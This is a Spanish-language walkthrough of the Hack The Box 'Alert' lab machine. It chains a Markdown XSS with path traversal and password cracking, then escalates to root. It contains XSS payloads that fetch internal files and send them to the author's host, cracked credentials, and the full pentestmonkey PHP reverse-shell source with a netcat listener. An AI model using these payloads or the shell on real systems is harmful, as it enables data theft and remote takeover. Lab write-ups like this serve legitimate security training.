---
title: Alert
description: Alert es una máquina Linux de nivel fácil con un sitio web para subir, ver y compartir archivos Markdown. El sitio es vulnerable a XSS, que se explota para acceder a una página interna vulnerable a Arbitrary File Read y se utiliza para obtener acceso al hash de una contraseña. Posteriormente, se descifra el hash para revelar las credenciales utilizadas para obtener acceso SSH al objetivo. La enumeración de los procesos que se ejecutan en el sistema muestra un archivo PHP que se ejecuta regularmente, con privilegios excesivos para el grupo de administración al que pertenece nuestro usuario, lo que nos permite sobrescribir el archivo para la ejecución de código como root.
date: 2024-12-14
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-alert/alert_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - tcp
  - ssh
  - http
  - xss
  - fuzzing_web
  - lfi
  - arbitrary_file_read
  - password_attacks
  - port_forwarding
  - rce
  - information_gathering
  - web_analysis
  - foothold
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/alert:-$ ping -c 1 10.10.11.44
PING 10.10.11.44 (10.10.11.44) 56(84) bytes of data.
64 bytes from 10.10.11.44: icmp_seq=1 ttl=63 time=397 ms

--- 10.10.11.44 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 396.557/396.557/396.557/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/alert:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 10.10.11.44
Host: 10.10.11.44 ()    Status: Up
Host: 10.10.11.44 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/alert:-$ sudo nmap -sCV -vvv -p22,80 -oN nmap2 10.10.11.44
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSrBVJEKTgtUohrzoK9i67CgzqLAxnhEsPmW8hS5CFFGYikUduAcNkKsmmgQI09Q+6pa+7YHsnxcerBnW0taI//IYB5TI/LSE3yUxyk/ROkKLXPNiNGUhC6QiCj3ZTvThyHrFD9ZTxWfZKEQTcOiPs15+HRPCZepPouRtREGwmJcvDal1ix8p/2/C8X57ekouEEpIk1wzDTG5AM2/D08gXXe0TP+KYEaZEzAKM/mQUAqNTxfjc9x5rlfPYW+50kTDwtyKta57tBkkRCnnns0YRnPNtt0AH374ZkYLcqpzxwN8iTNXaeVT/dGfF4mA1uW89hSMarmiRgRh20Y1KIaInHjv9YcvSlbWz+2sz3ev725d4IExQTvDR4sfUAdysIX/q1iNpleyRgM4cvDMjxD6lEKpvQYSWVlRoJwbUUnJqnmZXboRwzRl+V3XCUaABJrA/1K1gvJfsPcU5LX303CV6LDwvLJIcgXlEbtjhkcxz7b7CS78BEW9hPifCUDGKfUs=
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHYLF+puo27gFRX69GBeZJqCeHN3ps2BScsUhKoDV66yEPMOo/Sn588F/wqBnJxsPB3KSFH+kbYW2M6erFI3U5k=
|   256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/QUl3gapBOWCGEHplsOKe2NlWjlrb5vTTLjg6gMuGl
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://alert.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
```terminal
/home/kali/Documents/htb/machines/alert:-$ echo '10.10.11.44\talert.htb' | sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/htb/machines/alert:-$ whatweb alert.htb
http://alert.htb [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.44], RedirectLocation[index.php?page=alert], Title[Alert - Markdown Viewer]
http://alert.htb/index.php?page=alert [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.44], Title[Alert - Markdown Viewer] 
```

---
## Web Analysis

El objetivo aloja un sitio web que permite a los usuarios subir, visualizar y compartir archivos en formato Markdown.

![](assets/img/htb-writeup-alert/alert1_1.png)

Al subir un archivo `.md`, se presenta la opción de presionar el botón `View`, que redirige a `/visualizer.php`. En la parte inferior de la página, se encuentra un botón llamado `Share Markdown`, el cual proporciona un enlace directo al archivo.

![](assets/img/htb-writeup-alert/alert1_2.png)

Tras analizar este comportamiento, identifico que la aplicación es vulnerable a Cross-Site Scripting. Es posible inyectar un payload malicioso dentro de un archivo Markdown y ejecutar JavaScript.

```terminal
/home/kali/Documents/htb/machines/alert:-$ echo '<script>alert(1)</script>' > test2.md
```

![](assets/img/htb-writeup-alert/alert1_3.png)
![](assets/img/htb-writeup-alert/alert1_4.png)

---

Otra funcionalidad interesante del servicio, es el formulario de contacto en la sección `Contact Us`.

![](assets/img/htb-writeup-alert/alert1_5.png)

```terminal
/home/kali/Documents/htb/machines/alert:-$ touch index.php

/home/kali/Documents/htb/machines/alert:-$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Si ingreso un enlace en el campo `Your message`, apuntando a mi servidor, al enviarlo, el destinatario del mensaje hace clic en el enlace. Esto se confirma al recibir una solicitud `GET /index.php` desde la dirección `10.10.11.44`.

![](assets/img/htb-writeup-alert/alert1_6.png)


---

Realizo un escaneo con dirb para identificar archivos y directorios en el sitio web objetivo.

```terminal
/home/kali/Documents/htb/machines/alert:-$ dirb http://alert.htb/ -X .php
---- Scanning URL: http://alert.htb/ ----
+ http://alert.htb/contact.php (CODE:200|SIZE:24)
+ http://alert.htb/index.php (CODE:302|SIZE:660)
+ http://alert.htb/messages.php (CODE:200|SIZE:1)
```

Y el escaneo revela dos archivos adicionales: `contact.php` y `messages.php`.

Posteriormente, utilizo ffuf para buscar subdominios del sitio objetivo.

```terminal
/home/kali/Documents/htb/machines/alert:-$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -ic -t 200 -c --fw=20
statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 261ms]
```

El resultado indica la presencia de un subdominio `statistics.alert.htb`.

```terminal
/home/kali/Documents/htb/machines/alert:-$ sudo sed -i '$d' /etc/hosts
/home/kali/Documents/htb/machines/alert:-$ echo '10.10.11.44\talert.htb\tstatistics.alert.htb' | sudo tee -a /etc/hosts
```

Al intentar acceder a `statistics.alert.htb`, me encuentro con una página con una interfaz de login básica en HTML.

![](assets/img/htb-writeup-alert/alert1_7.png)

---
## Foothold

Aprovechando la combinación de una vulnerabilidad XSS en la web y un usuario que interactúa con los enlaces recibidos, intento encadenar ambos comportamientos para obtener una ejecución remota.

Levanto un servidor HTTP en Python para recibir las conexiones generadas por el XSS.

```terminal
/home/kali/Documents/htb/machines/alert:-$ python3 -m http.server 8005
Serving HTTP on 0.0.0.0 port 8005 (http://0.0.0.0:8005/) ...
```

Creo un archivo Markdown que contiene un script malicioso diseñado para contactar mi servidor.

```terminal
/home/kali/Documents/htb/machines/alert:-$ echo '<script>fetch("http://10.10.16.60:8005/")</script>' > payload0.md
```

Subo el archivo a la web, copio el enlace generado y lo envío a través del formulario de contacto.

![](assets/img/htb-writeup-alert/alert2_1.png)

Nótese, que las conexiones recibidas son distintas

* Primera conexión: Ocurre cuando abro el enlace desde mi navegador, ejecutando el XSS en mi entorno.

```terminal
10.10.16.60 - - [02/Apr/2025 13:16:34] "GET / HTTP/1.1" 200 -
```

![](assets/img/htb-writeup-alert/alert2_2.png)


* Segunda conexión: Sucede cuando el destinatario del mensaje accede al enlace, confirmando que la ejecución remota fue exitosa.

```terminal
10.10.11.44 - - [02/Apr/2025 13:16:40] "GET / HTTP/1.1" 200 -
```

![](assets/img/htb-writeup-alert/alert2_3.png)

---

Dado que el cookie hijacking no parece viable, intento verificar si el usuario que abre los enlaces tiene una vista diferente del sitio. Para ello, diseño un nuevo payload que extrae el contenido de la página principal y lo envía a mi servidor.

```terminal
/home/kali/Documents/htb/machines/alert:-$ cat payload1.md
<script>
fetch("http://alert.htb/index.php")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.16.60:8005/?file_content=" + encodeURIComponent(data));
  });
</script>
```

![](assets/img/htb-writeup-alert/alert2_4.png)

Después de recibir el contenido de la página, copio la respuesta URL-encodeada y la decodifico en [CyberChef](https://cyberchef.org/).

El resultado revela que el usuario que abre el enlace tiene acceso a una pestaña adicional llamada `messages`, la cual no aparece en mi sesión.

Esto confirma dos puntos clave:
* El usuario que accede al enlace está autenticado.
* Tengo la capacidad de visualizar secciones restringidas del sitio a las que normalmente no tengo acceso.

![](assets/img/htb-writeup-alert/alert2_5.png)

---

Aprovechando la capacidad de extraer contenido desde la cuenta autenticada, modifico el script para obtener el contenido de `messages.php`.

```
/home/kali/Documents/htb/machines/alert:-$ cat payload2.md
<script>
fetch("http://alert.htb/messages.php")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.16.60:8005/?file_content=" + encodeURIComponent(data));
  });
</script>
```

![](assets/img/htb-writeup-alert/alert2_6.png)

Después de decodificar la respuesta, noto que la página contiene un enlace que utiliza un nombre de archivo como parámetro. Sin embargo, el archivo referenciado no contiene información útil.

![](assets/img/htb-writeup-alert/alert2_7.png)

---

Explorando más a fondo, descubro que puedo manipular el parámetro del enlace para leer archivos arbitrarios en el sistema. Esto indica la presencia de un LFI.

Para verificar la  vulnerabilidad, intento leer el archivo `/etc/passwd`.

```terminal
/home/kali/Documents/htb/machines/alert:-$ cat payload3.md
<script>
fetch("http://alert.htb/messages.php?file=../../../../etc/passwd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.16.60:8005/?file_content=" + encodeURIComponent(data));
  });
</script>
```

![](assets/img/htb-writeup-alert/alert2_8.png)
![](assets/img/htb-writeup-alert/alert2_9.png)

---

Confirmada la vulnerabilidad LFI, intento acceder al archivo de configuración `.htpasswd` en el subdominio `statistics.alert.htb`, con la esperanza de encontrar credenciales almacenadas para la autenticación.

```terminal
/home/kali/Documents/htb/machines/alert:-$ cat payload4.md
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.16.60:8005/?file_content=" + encodeURIComponent(data));
  });
</script>
```

![](assets/img/htb-writeup-alert/alert2_10.png)
![](assets/img/htb-writeup-alert/alert2_11.png)

---

El hash extraído del archivo `.htpasswd` se trata de `md5crypt`. Utilizo John the Ripper para crackearlo con el diccionario `rockyou.txt`.

```terminal
/home/kali/Documents/htb/machines/alert:-$ echo '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt

/home/kali/Documents/htb/machines/alert:-$ john --list=formats hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead

/home/kali/Documents/htb/machines/alert:-$ john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
manchesterunited (?)     
Session completed. 
```

Utilizo las credenciales encontradas, para conectarme vía SSH con el usuario `albert`, logrando acceso a la máquina.

```terminal
/home/kali/Documents/htb/machines/alert:-$ ssh albert@alert.htb
albert@alert.htb's password: manchesterunited

albert@alert:~$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)

albert@alert.htb:~$ cat user.txt
```

---
## Privilege Escalation

Verifico los usuarios con shell en el sistema.

```terminal
albert@alert:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
albert:x:1000:1000:albert:/home/albert:/bin/bash
david:x:1001:1002:,,,:/home/david:/bin/bash
```

Dentro de la máquina, identifico que el puerto 8080 está abierto y corre un servicio.

```terminal
albert@alert:~$ ss -tulnp
```

![](assets/img/htb-writeup-alert/alert3_1.png)

Verifico el proceso en ejecución.

```terminal
albert@alert:~$ ps aux | grep 8080
root        1001  0.0  0.6 207012 26508 ?        Ss   20:19   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
```

Utilizo curl para confirmar que el servicio muestra una página.

```terminal
albert@alert:~$ curl 127.0.0.1:8080
```

![](assets/img/htb-writeup-alert/alert3_2.png)

Visualizo el contenido del sitio, el cual corresponde a un "Website Monitor".

Profundizo en la enumeración de privilegios del usuario `albert` y descubro que tiene permisos de escritura sobre el directorio de configuración del servicio.

```terminal
albert@alert:~$ find / -group 1001 2>/dev/null
/opt/website-monitor/config
/opt/website-monitor/config/configuration.php
```

Posteriormente, establezco un túnel SSH para acceder al servicio desde mi máquina.

```terminal
/home/kali/Documents/htb/machines/alert:-$ ssh -L 8080:127.0.0.1:8080 albert@alert.htb -N -f
albert@alert.htb's password: manchesterunited
```

![](assets/img/htb-writeup-alert/alert3_3.png)

---

Pruebo colar una reverse shell en el directorio de configuración, aprovechando los permisos de escritura que tengo sobre el directorio. En este caso, copio el script de reverse shell de [pentestmonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php) y lo nombro `sh.php`.

```terminal
albert@alert:/opt/website-monitor/config$ cat sh.php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.60';  // CHANGE THIS
$port = 4321;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Luego, en mi máquina de ataque, inicio un listener con netcat.

```terminal
/home/kali/Documents/htb/machines/alert:-$ rlwrap nc -lnvp 4321
	listening on [any] 4321 ...
```

Ejecuto el archivo malicioso desde el servicio web, la conexión se establece exitosamente y obtenego acceso total al sistema.

```terminal
/home/kali/Documents/htb/machines/alert:-$ curl http://127.0.0.1:8080/config/sh.php

	... connect to [10.10.16.60] from (UNKNOWN) [10.10.11.44] 43762

root@alert:/# id
uid=0(root) gid=0(root) groups=0(root)

root@alert:/# cat /root/root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/636" target="_blank">***Litio7 has successfully solved Alert from Hack The Box***</a>
{: .prompt-info style="text-align:center" }
